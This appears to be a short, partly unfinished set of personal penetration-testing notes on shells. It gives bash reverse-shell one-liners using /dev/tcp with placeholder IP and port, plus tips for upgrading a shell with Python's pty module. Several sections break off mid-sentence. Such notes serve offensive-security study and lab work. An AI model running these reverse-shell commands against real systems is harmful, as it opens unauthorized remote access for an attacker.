# Shells

Always remember to check your IP: [[Linux Networking#Get your IP]]

## Bash Reverse

```bash
bash -i >& /dev/tcp/[IP]/[PORT] 0>&1
```

or

```bash
bash -c 'bash -i >& /dev/tcp/[IP]/[PORT] 0>&1'
```

## Upgrading a Shell

Often, you can simply run `/bin/bash` or equivalent to launch a better shell.

Use `echo "$SHELL"` to determine the shell you're using. Then specify the full path to that shell and it will sometimes spawn you a better, more interactive shell.

```bash
┌──(mac㉿kali)-[~]
└─$ echo "$SHELL"
/bin/bash
┌──(mac㉿kali)-[~]
└─$ /bin/bash
```

### Using Python to spawn /bin/bash

```bash
which bash
python -c 'import pty; pty.spawn("/bin/bash")'
```

Way to automatically pass result of `which bash` to `pty.spawn()` call?

### Backgrounding Shell Trick

Within your shell, possibly after 

*Note:* This does not work in meterpreter or metasploit shells in general.

### Use your shell to write an SSH key

This is one of the most reliable

### Girsh

[Repo link](https://github.com/nodauf/Girsh)